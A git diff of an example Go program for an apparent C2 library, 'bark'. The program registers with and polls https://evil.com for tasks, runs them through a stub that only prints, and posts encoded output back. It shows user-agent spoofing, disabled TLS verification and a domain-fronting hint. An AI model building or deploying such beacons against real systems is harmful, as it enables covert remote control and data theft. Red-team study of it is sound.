@@ -8,9 +8,10 @@ import (
 	"github.com/salukikit/bark"
 )
 
-func RunCmd(cmd string) {
+func RunCmd(cmd string) string {
 
-	output := fmt.Println(cmd)
+	fmt.Println(cmd)
+	return "Task run!"
 
 }
 
@@ -19,7 +20,7 @@ func YourDecryptFunc(respbody []byte) (string, bool) {
 
 }
 
-func YourEncryptfunc(output []byte) (string, bool) {
+func YourEncryptFunc(output []byte) (string, bool) {
 	return base64.StdEncoding.EncodeToString(output), true
 
 }
@@ -27,24 +28,24 @@ func YourEncryptfunc(output []byte) (string, bool) {
 func main() {
 
 	var reg bool
-	var verifycert bool
-	verifycert = false
+
+	verifycert := false
 
 	/*
 		The next line creates a simple default http transport, with tls verify skipped.
-		Both NewBarkerQUIC and NewBarkerHTTP just create an easy default *BarkerConfig, you can manually specify everything yourself with your own *BarkerConfig.
+		Both NewBarkerQUIC and NewBarkerHTTP just create an easy default *BarkerConfig, you can manually specify everything yourself with your own *bark.BarkerConfig
 	*/
-	httpconf := bark.NewBarkerHTTP("mynewhttpcomms", verifycert)
+	mybarker := bark.NewBarkerHTTP("mynewhttpcomms", verifycert)
+	mybarker.Ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
 
 	//root url should include the protocol, e.g. http:// or https://
-	// For now Bark doesn't handle what urls/sets of urls to use etc, that is down to you. However, you can set items like the host header via http.config.
 
 	rooturl := "https://evil.com"
 
 	/*
-		You can also manually specify Transport config etc via the httpconf.tr like so:
+		You can also manually specify Transport config etc via the .tr field like so:
 
-			httpconf.tr = &http.Transport{
+			mybarker.tr = &http.Transport{
 				TLSClientConfig: &tls.Config{
 					InsecureSkipVerify: true,
 					ServerName: "cloudfront.com",
@@ -54,13 +55,10 @@ func main() {
 		This can be useful for things like domain fronting, where you might need to manually specify the SNI header, or if you have really specific TLS needs.
 	*/
 
-	//Then update our barker with our new settings.
-	bark.UpdateBarkers("mynewhttpcomms", httpconf)
-
-	// registration command loop
-
 	for !reg {
-		resp, err := bark.Beacon("mynewhttpcomms", rooturl)
+
+		regurl := rooturl + "/register"
+		resp, err := mybarker.Beacon(regurl)
 		if err != nil {
 			time.Sleep(1000)
 			return
@@ -70,8 +68,7 @@ func main() {
 		ua, ok := YourDecryptFunc(resp)
 		if ok {
 			//Registered! Below could be a way of updating the user-agent or whatever you like with a new user-agent.
-			httpconf.Ua = ua
-			bark.UpdateBarkers("mynewhttpcomms", httpconf)
+			mybarker.Ua = ua
 			reg = true
 		}
 
@@ -81,18 +78,23 @@ func main() {
 	for {
 
 		beaconurl := rooturl + "/tasks"
+		posturl := rooturl + "/tasks/"
 
-		encCmd, err := bark.Beacon("mynewhttpcomms", beaconurl)
+		encCmd, err := mybarker.Beacon(beaconurl)
 		if err != nil {
 			time.Sleep(1000)
 			return
 		}
 		cmd, ok := YourDecryptFunc(encCmd)
 		if ok {
+
 			//Command is good, run command
 			output := RunCmd(cmd)
-			encdata := Yourencryptionfunc(output)
-			bark.Postout("mynewhttpcomms", rooturl, encdata)
+			encdata, ok := YourEncryptFunc([]byte(output))
+			if ok {
+				taskid := "123" //TaskID is usually sent in the path after the tasks url e.g. /tasks/123
+				mybarker.PostOutput(posturl+taskid, []byte(encdata))
+			}
 
 		}
 		time.Sleep(1000)
